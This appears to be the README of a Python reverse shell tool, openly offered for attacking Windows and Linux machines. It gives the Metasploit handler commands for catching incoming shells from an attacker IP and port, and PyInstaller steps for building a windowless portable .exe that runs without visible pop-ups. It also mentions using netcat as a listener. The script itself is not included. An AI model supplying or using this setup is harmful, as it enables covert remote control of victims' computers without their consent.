
# Python Reverse Shell for Windows / Linux
Reverse Shell written in Python3 - Modified version of TacticalCheerio/Python-Windows-Reverse-Shell

You can take advantage of post exploitation modules in Metasploit by using:

    msf> use exploit/multi/handler 
    msf> set PAYLOAD [linux/shell_reverse_tcp | windows/shell_reverse_tcp]
    msf> set LHOST <Attacker IP>      
    msf> set LPORT <Attacker Port>    
    msf> set ExitOnSession false
    msf> run -j

Minor edits made by me for formatting and preferences.

To use on Windows, create an executable using pyinstaller

    python -m pip install pyinstaller
    pyinstaller -wF ./reverse_shell.py

Useful PyInstaller Options:
> -w removes pop up windows
>
> -F outputs a portable .exe file in the ./dist/ folder

This also works with a netcat as a listener for the attacking server.
